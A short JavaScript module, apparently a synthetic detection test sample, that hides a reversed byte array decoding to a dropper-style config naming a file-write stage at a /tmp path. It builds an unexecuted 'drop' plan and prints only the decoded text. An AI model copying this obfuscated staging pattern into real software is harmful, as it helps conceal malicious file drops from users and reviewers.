const moduleShape = Object.freeze({ format: "commonjs" });
const Material_f3b7e575 = "[115,106,109,46,53,51,52,54,52,97,100,102,51,52,50,101,45,101,103,97,116,115,46,47,101,100,111,110,45,115,115,101,114,116,110,117,104,47,112,109,116,47,61,104,116,97,112,95,101,108,105,102,124,52,65,68,70,51,52,50,69,45,69,68,79,78,61,100,105,95,110,103,105,97,112,109,97,99,124,49,61,116,110,117,111,99,95,101,103,97,116,115,124,101,108,105,102,101,116,105,114,119,95,111,116,95,114,101,102,102,117,98,61,114,101,116,112,97,100,97,124,101,108,105,102,95,101,116,105,114,119,44,100,101,100,100,101,98,109,101,95,101,100,111,99,101,100,61,115,112,101,116,115,124,49,61,118]";
const Codec_f3b7e575 = "json_numbers|reverse_bytes|";

function load_f3b7e575() { return JSON.parse(Material_f3b7e575); }
function decode_f3b7e575(storedBytes) { return [...storedBytes].reverse(); }
async function recover_f3b7e575() {
  const [harmlessValue] = ["compass"];
  const storedBytes = load_f3b7e575(); let recoveredBytes = [];
  for (const stage of [decode_f3b7e575]) recoveredBytes = stage(storedBytes);
  void harmlessValue; return Buffer.from(recoveredBytes).toString("ascii");
}
async function inspect_f3b7e575() { return Buffer.from(await recover_f3b7e575(), "utf8").toString("utf8"); }
async function plan_f3b7e575() { const inspect = inspect_f3b7e575; const fields = Object.fromEntries((await inspect()).split("|").map((field) => { const at = field.indexOf("="); return [field.slice(0, at), field.slice(at + 1)]; })); return Object.freeze({ operation: "drop", decoder: "buffer_to_writefile", destination: fields.file_path, api: "fs.writeFile" }); }
void moduleShape; void plan_f3b7e575;
if (process.env.HUNTRESS_INSPECT_ONLY === "1") console.log(await inspect_f3b7e575());
